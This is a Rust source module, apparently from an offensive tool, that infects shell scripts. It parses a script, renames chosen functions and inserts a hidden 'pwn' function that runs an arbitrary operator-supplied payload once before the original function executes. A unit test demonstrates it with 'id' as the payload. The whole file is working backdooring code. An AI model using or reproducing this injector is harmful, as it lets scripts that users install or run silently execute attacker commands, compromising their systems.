use crate::args;
use crate::errors::*;
use blake2::{Blake2b512, Digest};
use serde::{Deserialize, Serialize};
use std::num::NonZeroU64;
use std::ops::Range;
use std::str;
use tokio::io::{AsyncWrite, AsyncWriteExt};
use yash_syntax::alias::AliasSet;
use yash_syntax::input::Memory;
use yash_syntax::parser::lex::Lexer;
use yash_syntax::parser::Parser;
use yash_syntax::source::Source;
use yash_syntax::syntax;

fn hash_script(script: &str) -> String {
    let mut hasher = Blake2b512::new();
    hasher.update(script.as_bytes());
    let res = hasher.finalize();
    hex::encode(&res[..6])
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Infect {
    pub payload: String,
    pub hook_functions: Vec<String>,
}

impl Infect {
    pub fn should_hook_fn(&self, function: &str) -> bool {
        self.hook_functions.iter().any(|x| x == function)
    }
}

impl TryFrom<args::InfectSh> for Infect {
    type Error = Error;

    fn try_from(args: args::InfectSh) -> Result<Self> {
        Ok(Infect {
            payload: args.payload,
            hook_functions: args.hooks,
        })
    }
}

fn truncate(s: &str, max_chars: usize) -> &str {
    match s.char_indices().nth(max_chars) {
        None => s,
        Some((idx, _)) => &s[..idx],
    }
}

#[derive(Debug)]
pub enum Patch {
    Rename {
        old: String,
        new: String,
        position: Range<usize>,
    },
}

impl Patch {
    pub fn position(&self) -> &Range<usize> {
        match self {
            Patch::Rename { position, .. } => position,
        }
    }
}

pub async fn infect<W: AsyncWrite + Unpin>(
    config: &Infect,
    script: &[u8],
    out: &mut W,
) -> Result<()> {
    let script = str::from_utf8(script).context("Failed to decode script as utf8")?;

    let hash = hash_script(script);

    // First, prepare an input object that the lexer reads from.
    let input = Box::new(Memory::new(script));

    // Next, create a lexer.
    let line = NonZeroU64::new(1).unwrap();
    let mut lexer = Lexer::new(input, line, Source::Unknown);

    // Then, create a new parser borrowing the lexer.
    let aliases = AliasSet::new();
    let mut parser = Parser::new(&mut lexer, &aliases);

    let mut patches = Vec::new();

    loop {
        let line = parser
            .command_line()
            .await
            .map_err(|err| anyhow!("Failed to parse line in shell script: {:#?}", err))?;
        let Some(line) = line else { break };

        for item in &line.0 {
            for cmd in &item.and_or.first.commands {
                if let syntax::Command::Function(fun) = cmd.as_ref() {
                    let name = fun.name.to_string();
                    if config.should_hook_fn(&name) {
                        let patched_name = format!("{}_{}", name, hash);
                        // let word = fn_name(&patched_name)?;
                        let position = &fun.name.location.range;
                        let code = fun.body.to_string();

                        let truncated = truncate(&code, 120);
                        let is_truncated = truncated.len() != code.len();

                        debug!(
                            "Found function {:?} at {:?}: {:?}{}",
                            name,
                            position,
                            truncated,
                            if is_truncated { " (truncated)" } else { "" }
                        );
                        patches.push(Patch::Rename {
                            old: name,
                            new: patched_name,
                            position: position.clone(),
                        });
                    }
                }
            }
        }
    }

    debug!("Sorting generated patches...");
    patches.sort_by_key(|a| a.position().start);

    debug!("Checking for overlaps...");
    let (overlap, _) =
        patches
            .iter()
            .map(|x| x.position())
            .fold((false, 0), |(overlap, cur), next| {
                let overlap = overlap || next.start < cur;
                (overlap, next.end)
            });
    if overlap {
        bail!("Shell script couldn't be modified, the generated patches overlap");
    }

    debug!("Generating script...");
    let mut cur = 0;
    let mut installed_pwn_function = false;

    for patch in &patches {
        let pos = patch.position();
        out.write_all(script[cur..pos.start].as_bytes()).await?;

        match patch {
            Patch::Rename { old, new, .. } => {
                if !installed_pwn_function {
                    out.write_all(
                        format!(
                        "pwn_{hash}() {{ test -n \"$pwned_{hash}\" && return; pwned_{hash}=1; {}; }}\n",
                        config.payload,
                        hash = hash,
                    )
                        .as_bytes(),
                    )
                    .await?;
                    out.write_all(
                        format!("{}() {{ pwn_{hash}; {} \"$@\"; }}\n", old, new, hash = hash)
                            .as_bytes(),
                    )
                    .await?;
                    installed_pwn_function = true;
                }
                out.write_all(new.as_bytes()).await?
            }
        }

        cur = pos.end;
    }

    // write remaining script
    if cur < script.len() {
        out.write_all(script[cur..].as_bytes()).await?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_simple_infect() -> Result<()> {
        let mut buf = Vec::new();
        infect(
            &Infect {
                payload: "id".to_string(),
                hook_functions: vec!["foo".to_string()],
            },
            b"#!/bin/sh
echo 1
foo() {
    echo 3
}

# this is a comment
# this is another comment
echo 2
foo
",
            &mut buf,
        )
        .await?;
        let script = String::from_utf8(buf)?;
        assert_eq!(
            script,
            "#!/bin/sh
echo 1
pwn_552c23d59a98() { test -n \"$pwned_552c23d59a98\" && return; pwned_552c23d59a98=1; id; }
foo() { pwn_552c23d59a98; foo_552c23d59a98 \"$@\"; }
foo_552c23d59a98() {
    echo 3
}

# this is a comment
# this is another comment
echo 2
foo
"
        );
        Ok(())
    }
}
